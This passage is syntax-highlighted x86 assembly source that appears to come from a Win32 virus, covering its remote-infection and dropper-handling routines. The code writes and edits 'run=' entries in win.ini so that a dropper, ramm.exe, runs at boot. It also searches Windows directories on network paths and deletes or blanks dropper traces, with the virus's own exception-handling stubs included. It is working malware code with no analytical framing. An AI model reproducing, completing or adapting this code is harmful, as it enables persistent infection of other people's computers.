       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_WritePrivateProfileStringA</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cannot_roam</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">test_next</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">@endsz</span><span class="sc0">                                      </span><span class="sc1">;go and try the next</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">                     </span><span class="sc1">;windows path!</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">test_paths</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">cannot_roam</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">smash_dropper</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                                 </span><span class="sc1">;this procedure acts like</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;this:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                                    </span><span class="sc1">;if the file ramm.exe</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ramm_name</span><span class="sc0">                              </span><span class="sc1">;exists in the windows dir</span><span class="sc0">
</span><span class="sc5">r_n</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                               </span><span class="sc1">;and there is no entry</span><span class="sc0">
</span><span class="sc5">ramm_name</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;to run it at next boot</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;in the win.ini file, then</span><span class="sc0">
                                                   </span><span class="sc1">;it will erase the file.</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">r_n</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;if the file ramm.exe</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                    </span><span class="sc1">;does not exist, but there</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_lstrlen</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;is an entry in the win</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;ini file, then it will</span><span class="sc0">
                                                   </span><span class="sc1">;remove the entry.</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">drop</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;If both are present</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;they are left alone.</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">r_n</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_lstrcat</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">W32FD</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;locate ramm.exe</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindFirstFileA</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ok</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_file</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ok</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_file</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">r_n</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;save name</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">droppername</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_lstrcpy</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">winini</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_lstrcat</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;open win.ini</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CreateFileA</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_need</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hfile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetFileSize</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CreateFileMappingA</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_need_1</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hmap</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_MAP_ALL_ACCESS</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hmap</span><span class="sc4">]</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_MapViewOfFile</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_need_2</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">src_loop</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'mmar'</span><span class="sc0">               </span><span class="sc1">;search "ramm.exe"</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_ramm</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'exe.'</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">found_ramm</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_ramm</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">src_loop</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">droppername</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_DeleteFileA</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">kill_memo</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">found_ramm</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ok</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">kill_memo</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">rep_for_run</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"=nur"</span><span class="sc0">                           </span><span class="sc1">;search backwards for</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">finished_searching</span><span class="sc0">                       </span><span class="sc1">;"run="</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">kill_memo</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">rep_for_run</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">finished_searching</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;put blanks over it!</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" "</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">kill_memo</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;close win.ini!</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_need_2</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hmap</span><span class="sc4">]</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CloseHandle</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_need_1</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CloseHandle</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_need</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">smash_dropper</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">windirs</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\Windows"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\WinNT"</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\Win"</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\Win95"</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\Win98"</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">winini</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\Win.ini"</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">drop</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\ramm.exe"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">cmd</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"run"</span><span class="sc0">      </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">myname</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">droppername</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">winininame</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">RemoteInfection</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">done_net</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">THREAD6SEH</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restore_thread6_seh</span><span class="sc0">                     </span><span class="sc1">;host</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread6Exception</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;if we had an error we</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;must restore the ESP</span><span class="sc0">
